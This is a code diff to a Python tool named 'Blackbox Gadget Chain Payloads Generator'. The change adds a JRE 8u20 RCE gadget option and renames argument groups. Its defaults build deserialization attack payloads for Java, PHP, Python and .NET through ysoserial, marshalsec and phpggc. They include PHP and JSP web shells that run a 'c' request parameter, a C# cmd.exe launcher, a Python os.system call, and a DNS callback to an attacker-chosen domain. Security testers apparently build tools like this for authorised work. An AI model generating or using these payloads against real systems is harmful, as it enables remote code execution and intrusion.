@@ -61,6 +61,8 @@ def createGenerator(serializer, args):
         generator = Sploits(args)
     elif serializer == 'fastjson':
         generator = Fastjson(args)
+    elif serializer == 'jre8u20rcegadget':
+        generator = JRE8u20RCEGadget(args.java8u20_path, args.jre8u20rcegadget_path, args)
     else:
         logging.error(f"Unsupported serializer: {serializer}")
         generator = None
@@ -81,7 +83,7 @@ if __name__ == '__main__':
     description = "Blackbox Gadget Chain Payloads Generator (@darkpills)"
     default_system_command = 'nslookup %%chain_id%%.%%domain%%'
     language_serializer_map = {
-        'java': ['ysoserial', 'marshalsec', 'sploits', 'fastjson'],
+        'java': ['ysoserial', 'marshalsec', 'sploits', 'fastjson', 'jre8u20rcegadget'],
         'php': ['phpggc'],
         'python': ['pickle'],
         'csharp': ['ysoserial.net'],
@@ -128,26 +130,28 @@ if __name__ == '__main__':
     encoding_group.add_argument('-x', '--hex', help="Encode the payload as hex string", action="store_true")
 
     # php specific
-    phpggc_group = parser.add_argument_group('phpggc')
-    phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./bin/phpggc/phpggc")
-    phpggc_group.add_argument('--phar', help="Generate phar of the specified format into the output directory of -o", choices=['phar', 'tar', 'zip', 'jpg'])
-    phpggc_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
-    phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
-    phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
+    php_group = parser.add_argument_group('php')
+    php_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./bin/phpggc/phpggc")
+    php_group.add_argument('--phar', help="Generate phar of the specified format into the output directory of -o", choices=['phar', 'tar', 'zip', 'jpg'])
+    php_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
+    php_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
+    php_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
 
     # java specific
-    ysoserial_group = parser.add_argument_group('ysoserial')
-    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
-    ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
-    ysoserial_group.add_argument('--marshalsec-path', help="Full path to marshalsec jar", default="./bin/marshalsec-all.jar")
-    ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
+    java_group = parser.add_argument_group('java')
+    java_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
+    java_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
+    java_group.add_argument('--marshalsec-path', help="Full path to marshalsec jar", default="./bin/marshalsec-all.jar")
+    java_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
+    java_group.add_argument('--java8u20-path', help="Full path to java 8u20 bin", default="./bin/jre1.8.0_20/bin/java")
+    java_group.add_argument('--jre8u20rcegadget-path', help="Full path to https://github.com/pwntester/JRE8u20_RCE_Gadget jar", default="./bin/JRE8Exploit.jar")
 
     # python specific
-    pickle_group = parser.add_argument_group('pickle')
+    pickle_group = parser.add_argument_group('python')
     pickle_group.add_argument('--python-code', help="Python Code or path to a file containing the code", default="import os; os.system('%%system_command%%')")
     
     # .net specific
-    net_group = parser.add_argument_group('ysoserial.net')
+    net_group = parser.add_argument_group('.Net')
     net_group.add_argument('--csharp-code', help="C# Code or path to a file containing the C# code (ex: exploit.cs).", default="using System.Diagnostics;public class Exploit{public Exploit(){System.Diagnostics.Process.Start(\"cmd.exe\",\"/c %%system_command%%\");}}")
     net_group.add_argument('--csharp-code-dlls', help="Semicolon list of DLLs dependencies to compile C# code", default="System.dll")
     net_group.add_argument('--csharp-net-remoting', help="URL .Net remoting proxy, transports tcp, http, ipc are supported (https://github.com/codewhitesec/RogueRemotingServer>)", default="http://%%domain%%/%%chain_id%%")
